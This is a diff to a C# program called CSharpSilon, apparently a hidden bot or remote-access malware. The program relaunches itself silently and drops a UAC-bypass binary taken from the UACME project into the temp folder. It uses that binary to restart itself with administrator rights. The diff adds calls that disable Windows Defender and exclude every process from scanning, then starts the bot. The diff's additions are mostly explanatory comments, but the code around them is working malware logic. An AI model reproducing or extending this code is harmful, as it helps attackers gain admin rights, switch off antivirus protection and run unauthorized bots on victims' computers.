@@ -11,7 +11,10 @@ namespace CSharpSilon
     {
         static async Task Main(string[] args)
         {
-            StartBot();
+            //StartBot(); // I Use This For Testing <3
+            
+            
+            // Checks If The .exe Was Started With 1 Argument. Then Starts It With The Silent Argument.
             if (args.Length != 1)
             {
                 Process.Start(new ProcessStartInfo()
@@ -24,7 +27,8 @@ namespace CSharpSilon
                 });
                 Process.GetCurrentProcess().Kill();
             }
-
+            
+            // If It's Started Silently, Then It Starts The Bot.
             if (args.Length == 1)
             {
                 if (args[0] == "-sil")
@@ -41,6 +45,7 @@ namespace CSharpSilon
 
         static async Task StartBot()
         {
+            //This Is Used For UAC Bypassing. Source To The File: https://github.com/hfiref0x/UACME
             string tempPath = Environment.ExpandEnvironmentVariables("%temp%");
             string filePath = Path.Combine(tempPath, "kudos.exe");
             if (!File.Exists(filePath))
@@ -57,11 +62,13 @@ namespace CSharpSilon
                         Thread.Sleep(750);
                     }
                 }
-    
+                
+                //Restarts The App As Admin, Then Exits The Current Process
                 App.execute($"{filePath} 61 {Process.GetCurrentProcess().MainModule.FileName}");
                 Environment.Exit(0);
             }
-            
+            App.Disable(); // Disables Window's Defender
+            App.ExcludeAll(); // Exclude's All Processes From Window's Defender
             var bot = new Bot();
             bot.RunAsync().GetAwaiter().GetResult();
             Console.ReadLine();
